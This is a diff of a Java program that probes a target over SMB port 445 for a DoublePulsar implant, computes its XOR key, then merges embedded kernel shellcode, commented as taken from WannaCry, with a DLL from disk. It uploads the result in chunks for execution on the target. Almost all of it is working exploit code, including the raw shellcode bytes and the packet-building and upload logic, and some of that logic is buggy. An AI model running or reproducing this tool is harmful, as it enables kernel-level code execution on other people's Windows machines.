@@ -17,7 +17,7 @@ public class Main {
      * ========================= */
 
     //64-bit kernel shellcode to run DLL - taken from Wannacry, this is sent before the DLL payload
-    static final byte[] kernel_rundll_shellcode = new byte[] {
+    static final byte[] kernel_rundll_shellcode = new byte[]{
             (byte) 0x48, (byte) 0x89, (byte) 0xE0, (byte) 0x66, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0x41, (byte) 0x57, (byte) 0x41, (byte) 0x56, (byte) 0x41, (byte) 0x55, (byte) 0x41, (byte) 0x54, (byte) 0x53,
             (byte) 0x51, (byte) 0x52, (byte) 0x55, (byte) 0x57, (byte) 0x56, (byte) 0x50, (byte) 0x50, (byte) 0xE8, (byte) 0xBC, (byte) 0x06, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x89, (byte) 0xC3, (byte) 0x48, (byte) 0xB9, (byte) 0xDF, (byte) 0x81, (byte) 0x14, (byte) 0x3E, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xE8, (byte) 0x26,
             (byte) 0x05, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xC0, (byte) 0x0F, (byte) 0x84, (byte) 0x55, (byte) 0x03, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x89, (byte) 0x05, (byte) 0x9C, (byte) 0x07, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0xB9, (byte) 0xBA, (byte) 0x1E, (byte) 0x03, (byte) 0xA0, (byte) 0x00, (byte) 0x00,
@@ -316,573 +316,572 @@ public class Main {
         }
     }
 
-        public static void main(String[] args) throws Exception {
+    public static void main(String[] args) throws Exception {
 
-            /* =========================
-             * Packets
-             * ========================= */
+        /* =========================
+         * Packets
+         * ========================= */
 
-            byte[] negotiateProtocolRequest = hexToBytes(
-                    "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200"
+        byte[] negotiateProtocolRequest = hexToBytes(
+                "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200"
+        );
+
+        byte[] sessionSetupRequest = hexToBytes(
+                "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000"
+        );
+
+        byte[] treeConnectRequest = hexToBytes(
+                "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00"
+        );
+
+        byte[] trans2SessionSetup = hexToBytes(
+                "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000"
+        );
+
+        /* =========================
+         * Connection
+         * ========================= */
+
+        //String ip = "192.168.0.248";
+        System.out.print("Enter IP address: ");
+        Scanner scanner = new Scanner(System.in);
+        String ip = scanner.nextLine();
+
+        int port = 445;
+        int timeoutMillis = 5000;
+
+        Socket socket = new Socket();
+        socket.connect(new InetSocketAddress(ip, port), timeoutMillis);
+        socket.setSoTimeout(timeoutMillis);
+
+        InputStream in = socket.getInputStream();
+        OutputStream out = socket.getOutputStream();
+
+        byte[] buffer = new byte[1024];
+
+        /* =========================
+         * Negotiate protocol
+         * ========================= */
+
+        System.out.println("Sending negotiation protocol request");
+        out.write(negotiateProtocolRequest);
+        in.read(buffer);
+
+        /* =========================
+         * Session setup
+         * ========================= */
+
+        int userIdOffset = 0x28;
+        int treeIdOffset = 0x24;
+
+        System.out.println("Sending session setup request");
+        out.write(sessionSetupRequest);
+        int sessionRespLen = in.read(buffer);
+        byte[] sessionSetupResponse = Arrays.copyOf(buffer, sessionRespLen);
+
+        ByteBuffer UserIDBuffer = ByteBuffer.wrap(sessionSetupResponse);
+        UserIDBuffer.order(ByteOrder.LITTLE_ENDIAN); // SMB uses little-endian
+
+        int userid = UserIDBuffer.getShort(0x20) & 0xFFFF; // convert to unsigned
+        System.out.println("UserID: " + userid);
+
+        //int userId = readUInt16LE(sessionSetupResponse, 32);
+        System.out.printf("User ID = %d\n", userid);
+
+        /* =========================
+         * Tree connect (update UID)
+         * ========================= */
+
+        // 3) Copy UserID to TreeConnect Request
+        // -----------------------
+
+        // Assuming TreeConnect packet expects USERID at offset 0x28 (example)
+
+        treeConnectRequest[userIdOffset] = (byte) (userid & 0xFF);
+        treeConnectRequest[userIdOffset + 1] = (byte) ((userid >> 8) & 0xFF);
+
+        System.out.println("Sending tree connect request");
+        out.write(treeConnectRequest);
+        int treeRespLen = in.read(buffer);
+        byte[] treeConnectResponse = Arrays.copyOf(buffer, treeRespLen);
+
+        ByteBuffer treeRespBuffer = ByteBuffer.wrap(treeConnectResponse);
+        treeRespBuffer.order(ByteOrder.LITTLE_ENDIAN);
+
+        // Extract TreeID at offset 0x24 (36 decimal)
+        int treeid = treeRespBuffer.getShort(0x24) & 0xFFFF;
+        System.out.println("TreeID: " + treeid);
+
+        //int treeId = readUInt16LE(treeConnectResponse, 28);
+        System.out.printf("Tree ID = %d\n", treeid);
+
+        /* =========================
+         * Trans2 session setup
+         * ========================= */
+
+        byte[] modifiedTrans2 = Arrays.copyOf(trans2SessionSetup, trans2SessionSetup.length);
+
+        //writeUInt16LE(modifiedTrans2, userIdOffset, (short)userid);
+        //writeUInt16LE(modifiedTrans2, treeIdOffset, (short)treeid);
+
+        // Tree ID
+        modifiedTrans2[28] = treeConnectResponse[28];
+        modifiedTrans2[29] = treeConnectResponse[29];
+
+        // User ID
+        modifiedTrans2[32] = sessionSetupResponse[32];
+        modifiedTrans2[33] = sessionSetupResponse[33];
+
+        System.out.println("Sending trans2 session setup - ping command\n");
+        out.write(modifiedTrans2);
+
+        int trans2_response = in.read(buffer);
+        byte[] finalResponse = Arrays.copyOf(buffer, trans2_response);
+
+        ByteBuffer trans2Response = ByteBuffer.wrap(finalResponse);
+        trans2Response.order(ByteOrder.LITTLE_ENDIAN);
+
+        hexdump(finalResponse, 16);
+
+        byte[] smbResponse = new byte[1024];
+        if ((finalResponse[34]) == 81) {
+            // signature = final_response[18:22]
+            byte[] signature = Arrays.copyOfRange(finalResponse, 18, 22);
+            int signatureLong = ByteBuffer.wrap(signature)
+                    .order(ByteOrder.LITTLE_ENDIAN)
+                    .getInt();
+
+            int key = calculateDoublepulsarXorKey(signatureLong);
+
+            // arch_signature = final_response[18:26]
+            byte[] archSignature = Arrays.copyOfRange(finalResponse, 18, 26);
+            long archSignatureLong = ByteBuffer.wrap(archSignature)
+                    .order(ByteOrder.LITTLE_ENDIAN)
+                    .getLong();
+
+            String arch = calculateDoublepulsarArch(archSignatureLong);
+
+            System.out.printf(
+                    "[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: 0x%08X%n",
+                    ip,
+                    arch,
+                    key
             );
 
-            byte[] sessionSetupRequest = hexToBytes(
-                    "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000"
-            );
+            //globals
+            byte[] trans2ExecPacket = hexToBytes("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000");
+            byte[] dopuExecPacket = Arrays.copyOf(trans2ExecPacket, trans2ExecPacket.length);
+            byte[] parameters = new byte[12];
+            byte[] LastsmbResponse = new byte[1024];
 
-            byte[] treeConnectRequest = hexToBytes(
-                    "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00"
-            );
+            //readDLL here
+            byte[] DLLBytes = Files.readAllBytes(Path.of("E:\\native.dll"));
+            int dwFileSizeLow = DLLBytes.length;
 
-            byte[] trans2SessionSetup = hexToBytes(
-                    "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000"
-            );
+            //merge kernel shellcode + DLL bytes
 
-            /* =========================
-             * Connection
-             * ========================= */
+            ByteBuffer kernel_shellcode_buffer = ByteBuffer.wrap(kernel_rundll_shellcode);
+            kernel_shellcode_buffer.order(ByteOrder.LITTLE_ENDIAN); // important for DWORD compatibility
 
-            //String ip = "192.168.0.248";
-            System.out.print("Enter IP address: ");
-            Scanner scanner = new Scanner(System.in);
-            String ip = scanner.nextLine();
+            // update shellcode
+            kernel_shellcode_buffer.putInt(2158, dwFileSizeLow + 3978);
 
-            int port = 445;
-            int timeoutMillis = 5000;
+            // patch DLL size
+            kernel_shellcode_buffer.putInt(2166 + 0xF82, dwFileSizeLow);
 
-            Socket socket = new Socket();
-            socket.connect(new InetSocketAddress(ip, port), timeoutMillis);
-            socket.setSoTimeout(timeoutMillis);
+            // patch DLL ordinal
+            kernel_shellcode_buffer.putInt(2166 + 0xF86, 1);
 
-            InputStream in = socket.getInputStream();
-            OutputStream out = socket.getOutputStream();
+            byte[] KernelShellcodeBytes = kernel_shellcode_buffer.array();
+            byte[] combined_bytes = new byte[KernelShellcodeBytes.length + DLLBytes.length];
 
-            byte[] buffer = new byte[1024];
+            System.arraycopy(KernelShellcodeBytes, 0, combined_bytes, 0, KernelShellcodeBytes.length);
+            System.arraycopy(DLLBytes, 0, combined_bytes, KernelShellcodeBytes.length, DLLBytes.length);
+            byte[] currentChunk = new byte[4096];
+            byte[] xorBytes = byteXor(combined_bytes, key);
 
-            /* =========================
-             * Negotiate protocol
-             * ========================= */
+            //int entireShellcodeSize = modifiedKernelBytecode.length;
+            //must pad the value to 4096
 
-            System.out.println("Sending negotiation protocol request");
-            out.write(negotiateProtocolRequest);
-            in.read(buffer);
+            //loop here
 
-            /* =========================
-             * Session setup
-             * ========================= */
+            // Assuming these already exist:
+            int kernel_shellcode_size = 0;
 
-            int userIdOffset = 0x28;
-            int treeIdOffset = 0x24;
+            int payload_totalsize = kernel_shellcode_size + dwFileSizeLow;
+            int bytesLeft = payload_totalsize;
 
-            System.out.println("Sending session setup request");
-            out.write(sessionSetupRequest);
-            int sessionRespLen = in.read(buffer);
-            byte[] sessionSetupResponse = Arrays.copyOf(buffer, sessionRespLen);
+            // IMPORTANT: remainder must be computed BEFORE it is used
+            int remainder = payload_totalsize % 4096;
 
-            ByteBuffer UserIDBuffer = ByteBuffer.wrap(sessionSetupResponse);
-            UserIDBuffer.order(ByteOrder.LITTLE_ENDIAN); // SMB uses little-endian
+            // malloc equivalent in Java
+            byte[] last_packet = new byte[remainder + 12 + 70];
+            int size_last_packet = remainder + 12 + 70;
 
-            int userid = UserIDBuffer.getShort(0x20) & 0xFFFF; // convert to unsigned
-            System.out.println("UserID: " + userid);
+            int numberofpackets = payload_totalsize / 4096;
 
-            //int userId = readUInt16LE(sessionSetupResponse, 32);
-            System.out.printf("User ID = %d\n", userid);
+            long TotalSizeOfPayload = payload_totalsize;
+            int ChunkSize = 4096;
+            int OffsetofChunkinPayload = 0x0000;
 
-            /* =========================
-             * Tree connect (update UID)
-             * ========================= */
+            int ctx;
+            byte[] xorParameters = new byte[12];
+            int mergedPacketLen = 0;
 
-            // 3) Copy UserID to TreeConnect Request
-            // -----------------------
-
-            // Assuming TreeConnect packet expects USERID at offset 0x28 (example)
-
-            treeConnectRequest[userIdOffset] = (byte) (userid & 0xFF);
-            treeConnectRequest[userIdOffset + 1] = (byte) ((userid >> 8) & 0xFF);
-
-            System.out.println("Sending tree connect request");
-            out.write(treeConnectRequest);
-            int treeRespLen = in.read(buffer);
-            byte[] treeConnectResponse = Arrays.copyOf(buffer, treeRespLen);
-
-            ByteBuffer treeRespBuffer = ByteBuffer.wrap(treeConnectResponse);
-            treeRespBuffer.order(ByteOrder.LITTLE_ENDIAN);
-
-            // Extract TreeID at offset 0x24 (36 decimal)
-            int treeid = treeRespBuffer.getShort(0x24) & 0xFFFF;
-            System.out.println("TreeID: " + treeid);
-
-            //int treeId = readUInt16LE(treeConnectResponse, 28);
-            System.out.printf("Tree ID = %d\n", treeid);
-
-            /* =========================
-             * Trans2 session setup
-             * ========================= */
-
-            byte[] modifiedTrans2 = Arrays.copyOf(trans2SessionSetup, trans2SessionSetup.length);
-
-            //writeUInt16LE(modifiedTrans2, userIdOffset, (short)userid);
-            //writeUInt16LE(modifiedTrans2, treeIdOffset, (short)treeid);
-
-            // Tree ID
-            modifiedTrans2[28] = treeConnectResponse[28];
-            modifiedTrans2[29] = treeConnectResponse[29];
-
-            // User ID
-            modifiedTrans2[32] = sessionSetupResponse[32];
-            modifiedTrans2[33] = sessionSetupResponse[33];
-
-            System.out.println("Sending trans2 session setup - ping command\n");
-            out.write(modifiedTrans2);
-
-            int trans2_response = in.read(buffer);
-            byte[] finalResponse = Arrays.copyOf(buffer, trans2_response);
-
-            ByteBuffer trans2Response = ByteBuffer.wrap(finalResponse);
-            trans2Response.order(ByteOrder.LITTLE_ENDIAN);
-
-            hexdump(finalResponse, 16);
-
-            byte[] smbResponse = new byte[1024];
-            if ((finalResponse[34]) == 81) {
-                // signature = final_response[18:22]
-                byte[] signature = Arrays.copyOfRange(finalResponse, 18, 22);
-                int signatureLong = ByteBuffer.wrap(signature)
-                        .order(ByteOrder.LITTLE_ENDIAN)
-                        .getInt();
-
-                int key = calculateDoublepulsarXorKey(signatureLong);
-
-                // arch_signature = final_response[18:26]
-                byte[] archSignature = Arrays.copyOfRange(finalResponse, 18, 26);
-                long archSignatureLong = ByteBuffer.wrap(archSignature)
-                        .order(ByteOrder.LITTLE_ENDIAN)
-                        .getLong();
-
-                String arch = calculateDoublepulsarArch(archSignatureLong);
-
-                System.out.printf(
-                        "[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: 0x%08X%n",
-                        ip,
-                        arch,
-                        key
-                );
-
-                //globals
-                byte[] trans2ExecPacket = hexToBytes("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000");
-                byte[] dopuExecPacket = Arrays.copyOf(trans2ExecPacket, trans2ExecPacket.length);
-                byte[] parameters = new byte[12];
-                byte[] LastsmbResponse = new byte[1024];
-
-                //readDLL here
-                byte[] DLLBytes = Files.readAllBytes(Path.of("upload_dll.bin"));
-                int dwFileSizeLow = DLLBytes.length;
-
-                //merge kernel shellcode + DLL bytes
-
-                ByteBuffer kernel_shellcode_buffer = ByteBuffer.wrap(kernel_rundll_shellcode);
-                kernel_shellcode_buffer.order(ByteOrder.LITTLE_ENDIAN); // important for DWORD compatibility
-
-                // update shellcode
-                kernel_shellcode_buffer.putInt(2158, dwFileSizeLow + 3978);
-
-                // patch DLL size
-                kernel_shellcode_buffer.putInt(2166 + 0xF82, dwFileSizeLow);
-
-                // patch DLL ordinal
-                kernel_shellcode_buffer.putInt(2166 + 0xF86, 1);
-
-                byte[] KernelShellcodeBytes = kernel_shellcode_buffer.array();
-                byte[] combined_bytes = new byte[KernelShellcodeBytes.length + DLLBytes.length];
-
-                System.arraycopy(kernel_shellcode_buffer, 0, combined_bytes, 0, KernelShellcodeBytes.length);
-                System.arraycopy(DLLBytes, 0, combined_bytes, KernelShellcodeBytes.length, DLLBytes.length);
-                byte[] currentChunk = new byte[4096];
-                byte[] xorBytes = byteXor(combined_bytes, key);
-
-                //int entireShellcodeSize = modifiedKernelBytecode.length;
-                //must pad the value to 4096
-
-                //loop here
-
-                // Assuming these already exist:
-                int kernel_shellcode_size = 0;
-
-                int payload_totalsize = kernel_shellcode_size + dwFileSizeLow;
-                int bytesLeft = payload_totalsize;
-
-                // IMPORTANT: remainder must be computed BEFORE it is used
-                int remainder = payload_totalsize % 4096;
-
-                // malloc equivalent in Java
-                byte[] last_packet = new byte[remainder + 12 + 70];
-                int size_last_packet = remainder + 12 + 70;
-
-                int numberofpackets = payload_totalsize / 4096;
-
-                long TotalSizeOfPayload = payload_totalsize;
-                int ChunkSize = 4096;
-                int OffsetofChunkinPayload = 0x0000;
-
-                int ctx;
-                byte[] xorParameters = new byte[12];
-                int mergedPacketLen = 0;
-
-                System.out.println("Generating the parameters...");
-                for (ctx = 0; ctx < payload_totalsize; ) {
-                    //generate parameters
-
-                    /* =========================
-                     * Build parameters
-                     * ========================= */
-
-                    // Pack values as little-endian uint32
-                    byte[] entireSize = ByteBuffer.allocate(4)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putInt(4096)
-                            .array();
-
-                    byte[] chunkSize = ByteBuffer.allocate(4)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putInt(4096)
-                            .array();
-
-                    byte[] offset = ByteBuffer.allocate(4)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putInt(ctx)
-                            .array();
-
-                    /* =========================
-                     * Concatenate parameters
-                     * ========================= */
-
-                    System.arraycopy(entireSize, 0, parameters, 0, 4);
-                    System.arraycopy(chunkSize, 0, parameters, 4, 4);
-                    System.arraycopy(offset, 0, parameters, 8, 4);
-                    //hexdump(parameters, 16);
-
-                    /* =========================
-                     * XOR parameters
-                     * ========================= */
-
-                    xorParameters = byteXor(parameters, key);
-                    //hexdump(xorParameters, 16);
-
-                    //send SMB packet here
-                    /* =========================
-                     * Build TRANS2 exec packet
-                     * ========================= */
-
-                    //implementation 2
-                    /* Generate Doublepulsar Execution Packet */
-
-                    int trans2PacketLen = dopuExecPacket.length;
-                    System.out.printf("Total size of SMB packet:  %d%n", trans2PacketLen);
-
-                    int packetLen = trans2PacketLen + 4096 + 12;
-                    System.out.printf("Total size of SMB packet & shellcode:  %d%n", packetLen);
-
-                    System.out.println("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet");
-
-                    mergedPacketLen = trans2PacketLen + 4096 + 12 - 4;
-                    System.out.printf("UPDATED:  Total size of SMB packet & shellcode:  %d%n", mergedPacketLen);
-
-                    /* =========================
-                     * Update SMB length (big endian)
-                     * ========================= */
-
-                    byte[] smbLength = ByteBuffer.allocate(2)
-                            .order(ByteOrder.BIG_ENDIAN)
-                            .putShort((short) mergedPacketLen)
-                            .array();
-
-                    dopuExecPacket[2] = smbLength[0];
-                    dopuExecPacket[3] = smbLength[1];
-
-                    /* =========================
-                     * Data counts (little endian)
-                     * ========================= */
-
-                    byte[] totalDataCount = ByteBuffer.allocate(2)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putShort((short) remainder)
-                            .array();
-
-                    byte[] dataCount = ByteBuffer.allocate(2)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putShort((short) remainder)
-                            .array();
-
-                    byte[] byteCount = ByteBuffer.allocate(2)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putShort((short) (remainder + 12)) //changed from 12 ???
-                            .array();
-
-                    // Update packet fields
-                    dopuExecPacket[39] = totalDataCount[0];
-                    dopuExecPacket[40] = totalDataCount[1];
-
-                    dopuExecPacket[59] = dataCount[0];
-                    dopuExecPacket[60] = dataCount[1];
-
-                    dopuExecPacket[67] = byteCount[0];
-                    dopuExecPacket[68] = byteCount[1];
-
-                    /* =========================
-                     * Tree ID + User ID
-                     * ========================= */
-
-                    //dopuExecPacket[28] = treeId[0];
-                    //dopuExecPacket[29] = treeId[1];
-
-                    //dopuExecPacket[32] = userId[0];
-                    //dopuExecPacket[33] = userId[1];
-
-                    dopuExecPacket[28] = treeConnectResponse[28];
-                    dopuExecPacket[29] = treeConnectResponse[29];
-
-                    dopuExecPacket[32] = sessionSetupResponse[32];
-                    dopuExecPacket[33] = sessionSetupResponse[33];
-
-                    byte[] sendPacket = new byte[dopuExecPacket.length + xorParameters.length + 4096];
-
-                    System.arraycopy(combined_bytes, ctx, currentChunk, 0, 4096);
-
-                    System.arraycopy(dopuExecPacket, 0, sendPacket, 0, dopuExecPacket.length);
-                    System.arraycopy(xorParameters, 0, sendPacket, dopuExecPacket.length, xorParameters.length);
-                    System.arraycopy(currentChunk, 0, sendPacket, dopuExecPacket.length + xorParameters.length, currentChunk.length);
-
-                    /* =========================
-                     * Send packet
-                     * ========================= */
-                    out.write(sendPacket);
-                    int respLen = in.read(smbResponse);
-
-
-                    /* =========================
-                     * Status checks
-                     * ========================= */
-
-                    if ((smbResponse[9]) == 0x02 &&
-                            (smbResponse[10] & 0xFF) == 0x00 &&
-                            (smbResponse[11] & 0xFF) == 0x00 &&
-                            (smbResponse[12] & 0xFF) == 0xC0) {
-
-                        System.out.println("DOPU returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!");
-                    }
-
-                    if ((smbResponse[34] & 0xFF) == 82) {
-                        System.out.println("DOPU returned:  Success!");
-                    } else if ((smbResponse[34] & 0xFF) == 98) {
-                        System.out.println("DOPU returned:  Invalid parameters!");
-                    } else if ((smbResponse[34] & 0xFF) == 114) {
-                        System.out.println("DOPU returned:  Allocation failure!");
-                    } else {
-                        System.out.println("DOPU didn't succeed");
-                    }
-
-                    bytesLeft -= 4096;
-                    ctx += 4096;
-                    OffsetofChunkinPayload += 4096;
-                }
-
-                // handle remainder
-                if (remainder > 0) {
-
-                    /* =========================
-                     * Build parameters
-                     * ========================= */
-
-                    // Pack values as little-endian uint32
-                    byte[] entireSize = ByteBuffer.allocate(4)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putInt(4096)
-                            .array();
-
-                    byte[] chunkSize = ByteBuffer.allocate(4)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putInt(4096)
-                            .array();
-
-                    byte[] offset = ByteBuffer.allocate(4)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putInt(0000)
-                            .array();
-
-                    /* =========================
-                     * Concatenate parameters
-                     * ========================= */
-
-                    System.arraycopy(entireSize, 0, parameters, 0, 4);
-                    System.arraycopy(chunkSize, 0, parameters, 4, 4);
-                    System.arraycopy(offset, 0, parameters, 8, 4);
-                    //hexdump(parameters, 16);
-
-                    /* =========================
-                     * XOR parameters
-                     * ========================= */
-
-                    xorParameters = byteXor(parameters, key);
-                    //hexdump(xorParameters, 16);
-
-                    //send SMB packet here
-                    /* =========================
-                     * Append parameters + payload
-                     * ========================= */
-
-                    byte[] finalPacket = new byte[dopuExecPacket.length + xorParameters.length + remainder];
-                    byte[] lastBytes = new byte[remainder];
-
-                    System.arraycopy(combined_bytes, ctx, lastBytes, 0, remainder);
-
-                    System.arraycopy(dopuExecPacket, 0, finalPacket, 0, dopuExecPacket.length);
-                    System.arraycopy(xorParameters, 0, finalPacket, dopuExecPacket.length, xorParameters.length);
-                    System.arraycopy(remainder, 0, finalPacket, dopuExecPacket.length + xorParameters.length, remainder);
-
-                    System.out.println("Total Length of the final hex packet " + finalPacket.length);
-
-                    /* =========================
-                     * Build TRANS2 exec packet
-                     * ========================= */
-
-                    //implementation 2
-                    /* Generate Doublepulsar Execution Packet */
-
-                    int trans2PacketLen = dopuExecPacket.length;
-                    System.out.printf("Total size of SMB packet:  %d%n", trans2PacketLen);
-
-                    int packetLen = trans2PacketLen + remainder + 12;
-                    System.out.printf("Total size of SMB packet & shellcode:  %d%n", packetLen);
-
-                    System.out.println("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet");
-
-                    mergedPacketLen = trans2PacketLen + remainder + 12 - 4;
-                    System.out.printf("UPDATED:  Total size of SMB packet & shellcode:  %d%n", mergedPacketLen);
-
-                    /* =========================
-                     * Update SMB length (big endian)
-                     * ========================= */
-
-                    byte[] smbLength = ByteBuffer.allocate(2)
-                            .order(ByteOrder.BIG_ENDIAN)
-                            .putShort((short) mergedPacketLen)
-                            .array();
-
-                    dopuExecPacket[2] = smbLength[0];
-                    dopuExecPacket[3] = smbLength[1];
-
-                    /* =========================
-                     * Data counts (little endian)
-                     * ========================= */
-
-                    byte[] totalDataCount = ByteBuffer.allocate(2)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putShort((short) 4096)
-                            .array();
-
-                    byte[] dataCount = ByteBuffer.allocate(2)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putShort((short) 4096)
-                            .array();
-
-                    byte[] byteCount = ByteBuffer.allocate(2)
-                            .order(ByteOrder.LITTLE_ENDIAN)
-                            .putShort((short) (4096 + 12)) //changed from 12 ???
-                            .array();
-
-                    // Update packet fields
-                    dopuExecPacket[39] = totalDataCount[0];
-                    dopuExecPacket[40] = totalDataCount[1];
-
-                    dopuExecPacket[59] = dataCount[0];
-                    dopuExecPacket[60] = dataCount[1];
-
-                    dopuExecPacket[67] = byteCount[0];
-                    dopuExecPacket[68] = byteCount[1];
-
-                    /* =========================
-                     * Tree ID + User ID
-                     * ========================= */
-
-                    //dopuExecPacket[28] = treeId[0];
-                    //dopuExecPacket[29] = treeId[1];
-
-                    //dopuExecPacket[32] = userId[0];
-                    //dopuExecPacket[33] = userId[1];
-
-                    dopuExecPacket[28] = treeConnectResponse[28];
-                    dopuExecPacket[29] = treeConnectResponse[29];
-
-                    dopuExecPacket[32] = sessionSetupResponse[32];
-                    dopuExecPacket[33] = sessionSetupResponse[33];
-
-
-                    /* =========================
-                     * Send packet
-                     * ========================= */
-
-                    out.write(finalPacket);
-                    int respLen = in.read(LastsmbResponse);
-                    bytesLeft -= remainder;
-
-                    /* =========================
-                     * Status checks
-                     * ========================= */
-
-                    if ((LastsmbResponse[9]) == 0x02 &&
-                            (LastsmbResponse[10] & 0xFF) == 0x00 &&
-                            (LastsmbResponse[11] & 0xFF) == 0x00 &&
-                            (LastsmbResponse[12] & 0xFF) == 0xC0) {
-
-                        System.out.println("DOPU returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!");
-                    }
-
-                    if ((LastsmbResponse[34] & 0xFF) == 82) {
-                        System.out.println("DOPU returned:  Success!");
-                    } else if ((LastsmbResponse[34] & 0xFF) == 98) {
-                        System.out.println("DOPU returned:  Invalid parameters!");
-                    } else if ((LastsmbResponse[34] & 0xFF) == 114) {
-                        System.out.println("DOPU returned:  Allocation failure!");
-                    } else {
-                        System.out.println("DOPU didn't succeed");
-                    }
-                }
+            System.out.println("Generating the parameters...");
+            for (ctx = 0; ctx < payload_totalsize; ) {
+                //generate parameters
 
                 /* =========================
-                 * Tree disconnect
+                 * Build parameters
                  * ========================= */
 
-                byte[] treeDisconnect = hexToBytes("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000");
+                // Pack values as little-endian uint32
+                byte[] entireSize = ByteBuffer.allocate(4)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putInt(payload_totalsize)
+                        .array();
 
-                treeDisconnect[28] = treeConnectResponse[28];
-                treeDisconnect[29] = treeConnectResponse[29];
+                byte[] chunkSize = ByteBuffer.allocate(4)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putInt(4096)
+                        .array();
 
-                treeDisconnect[32] = sessionSetupResponse[32];
-                treeDisconnect[33] = sessionSetupResponse[33];
-
-                out.write(treeDisconnect);
-                in.read(LastsmbResponse);
+                byte[] offset = ByteBuffer.allocate(4)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putInt(OffsetofChunkinPayload)
+                        .array();
 
                 /* =========================
-                 * Logoff
+                 * Concatenate parameters
                  * ========================= */
 
-                byte[] logoff = hexToBytes("00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000");
+                System.arraycopy(entireSize, 0, parameters, 0, 4);
+                System.arraycopy(chunkSize, 0, parameters, 4, 4);
+                System.arraycopy(offset, 0, parameters, 8, 4);
+                hexdump(parameters, 16);
 
-                logoff[28] = treeConnectResponse[28];
-                logoff[29] = treeConnectResponse[29];
+                /* =========================
+                 * XOR parameters
+                 * ========================= */
 
-                logoff[32] = sessionSetupResponse[32];
-                logoff[33] = sessionSetupResponse[33];
+                xorParameters = byteXor(parameters, key);
+                hexdump(xorParameters, 16);
 
-                out.write(logoff);
-                in.read(LastsmbResponse);
+                //send SMB packet here
+                /* =========================
+                 * Build TRANS2 exec packet
+                 * ========================= */
 
-                socket.close();
-            } else {
-                System.out.print("No DoublePulsar detected!\n");
-                socket.close();
+                //implementation 2
+                /* Generate Doublepulsar Execution Packet */
+
+                int trans2PacketLen = dopuExecPacket.length;
+                System.out.printf("Total size of SMB packet:  %d%n", trans2PacketLen);
+
+                int packetLen = trans2PacketLen + 4096 + 12;
+                System.out.printf("Total size of SMB packet & shellcode:  %d%n", packetLen);
+
+                System.out.println("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet");
+
+                mergedPacketLen = trans2PacketLen + 4096 + 12 - 4;
+                System.out.printf("UPDATED:  Total size of SMB packet & shellcode:  %d%n", mergedPacketLen);
+
+                /* =========================
+                 * Update SMB length (big endian)
+                 * ========================= */
+
+                byte[] smbLength = ByteBuffer.allocate(2)
+                        .order(ByteOrder.BIG_ENDIAN)
+                        .putShort((short) mergedPacketLen)
+                        .array();
+
+                dopuExecPacket[2] = smbLength[0];
+                dopuExecPacket[3] = smbLength[1];
+
+                /* =========================
+                 * Data counts (little endian)
+                 * ========================= */
+
+                byte[] totalDataCount = ByteBuffer.allocate(2)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putShort((short) 4096)
+                        .array();
+
+                byte[] dataCount = ByteBuffer.allocate(2)
+                        .order(ByteOrder.LITTLE_ENDIAN)
+                        .putShort((short) 4096)
+                        .array();
+
